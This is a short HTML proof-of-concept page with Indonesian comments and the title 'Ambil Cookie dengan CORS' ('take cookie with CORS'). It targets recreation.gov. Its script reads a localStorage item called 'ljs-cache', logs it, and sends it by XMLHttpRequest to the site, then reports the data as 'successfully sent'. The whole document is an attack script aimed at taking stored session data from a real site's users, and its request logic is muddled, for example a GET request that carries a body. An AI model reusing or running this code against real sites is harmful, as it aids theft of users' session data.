<!DOCTYPE html>
<html>
<head>
    <title>POC - Ambil Cookie dengan CORS</title>
</head>
<body>
    <h1>POC - Ambil Cookie dengan CORS</h1>
    <script>
        // Mengambil data dari local storage
var localStorageData = localStorage.getItem('ljs-cache'); // Ganti 'namaKunci' dengan kunci yang sesuai

        console.log(localStorageData);

// Mengirim data menggunakan XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://www.recreation.gov/", true); // Ganti dengan URL server yang sesuai
xhr.setRequestHeader("Content-Type", "text/plain"); // Mengatur header

// Mengatur fungsi yang akan dijalankan ketika permintaan selesai
xhr.onload = function() {
    if (xhr.status === 200) {
        console.log('Data berhasil dikirim:', localStorageData);
    } else {
        console.error('Gagal mengirim data:', xhr.statusText);
    }
};

// Mengirim data
xhr.send(localStorageData);

    </script>
</body>
</html>
